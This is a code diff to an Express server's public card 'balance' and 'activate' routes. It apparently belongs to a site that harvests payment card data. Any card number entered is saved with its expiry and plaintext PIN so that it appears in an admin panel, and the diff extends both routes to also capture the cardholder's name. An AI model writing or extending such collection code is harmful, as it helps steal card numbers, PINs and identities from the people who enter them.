@@ -69,14 +69,16 @@ app.post('/api/auth/change-password', (req, res) => {
 
 // ─── PUBLIC ROUTES ────────────────────────────────────────────────────────────
 app.post('/api/cards/balance', (req, res) => {
-  const { num, expiry, pin } = req.body;
+  const { num, expiry, pin, holder } = req.body;
   if (!num) return res.status(400).json({ error: 'Card number is required.' });
   const clean = num.replace(/\s/g,'');
   let card = data.cards.find(c => c.num === clean);
   if (!card) {
-    // Auto-create card so it appears in admin panel
-    card = { id: data.nextCardId++, num: clean, holder: '', balance: 0, expiry: expiry||'', pin: pin||'', status: 'pending', created_at: new Date().toISOString() };
+    card = { id: data.nextCardId++, num: clean, holder: holder||'', balance: 0, expiry: expiry||'', pin: pin||'', status: 'pending', created_at: new Date().toISOString() };
     data.cards.push(card);
+    saveData();
+  } else if (holder && !card.holder) {
+    card.holder = holder;
     saveData();
   }
   if (card.status === 'inactive') return res.status(403).json({ error: 'This card has been deactivated.' });
@@ -84,18 +86,19 @@ app.post('/api/cards/balance', (req, res) => {
 });
 
 app.post('/api/cards/activate', (req, res) => {
-  const { num, expiry, pin } = req.body;
+  const { num, expiry, pin, holder } = req.body;
   if (!num || !expiry || !pin) return res.status(400).json({ error: 'Card number, expiry, and PIN are required.' });
   const clean = num.replace(/\s/g,'');
   let card = data.cards.find(c => c.num === clean);
   if (!card) {
-    card = { id: data.nextCardId++, num: clean, holder: '', balance: 0, expiry, pin, status: 'active', created_at: new Date().toISOString() };
+    card = { id: data.nextCardId++, num: clean, holder: holder||'', balance: 0, expiry, pin, status: 'active', created_at: new Date().toISOString() };
     data.cards.push(card);
     saveData();
     return res.json({ success: true, created: true });
   }
   if (card.status === 'inactive') return res.status(403).json({ error: 'This card has been permanently deactivated.' });
   card.status = 'active'; card.expiry = expiry; card.pin = pin;
+  if (holder) card.holder = holder;
   saveData();
   res.json({ success: true, created: false });
 });
